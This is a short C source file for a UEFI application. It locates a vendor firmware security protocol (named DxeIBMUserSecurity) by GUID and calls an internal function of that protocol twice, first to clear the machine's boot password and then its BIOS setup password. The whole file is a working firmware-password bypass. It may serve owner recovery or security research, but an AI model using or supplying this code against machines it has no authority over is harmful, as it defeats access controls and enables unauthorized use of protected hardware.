#include <efi.h>
#include <efilib.h>

EFI_STATUS
EFIAPI
efi_main (EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {
	InitializeLib(ImageHandle, SystemTable);
	Print(L"Hello, world!\n");

	//EFI_GUID guid={0x73e47354,0xb0c5,0x4e00,{0xa7,0x14,0x9d,0x0d,0x5a,0x4f,0xdb,0xfd}};
	EFI_GUID guid={0x67BE7D8A,0xFD0D,0x4DDF,{0xAE,0x65,0xBB,0x11,0x5C,0xCA,0x66,0xAE}};
    	void* intf;

    	if (uefi_call_wrapper(SystemTable->BootServices->LocateProtocol, 3, &guid,NULL,&intf)==EFI_SUCCESS)
    	{
    	    Print(L"Loaded DxeIBMUserSecurity\n");
	    void* fn = (void*)((char*)intf+0x18);
	    // Calling with 0 will clear the boot password
	    // Calling with 1 will clear the setup password

    	    Print(L"Clearing boot password\n");
    	    uefi_call_wrapper((INTN(*)(void*,int))(*(void**)fn), 2, intf,0);
    	    Print(L"Clearing setup password\n");
    	    uefi_call_wrapper((INTN(*)(void*,int))(*(void**)fn), 2, intf,1);
    	}
    	else
    	{
    	    Print(L"Unable to load DxeIBMUserSecurity\n");
    	}
	
    	Print(L"Press any key to continue\n");
	EFI_INPUT_KEY key;
	uefi_call_wrapper(SystemTable->ConIn->ReadKeyStroke, 2, SystemTable->ConIn, &key);
	return EFI_SUCCESS;
}
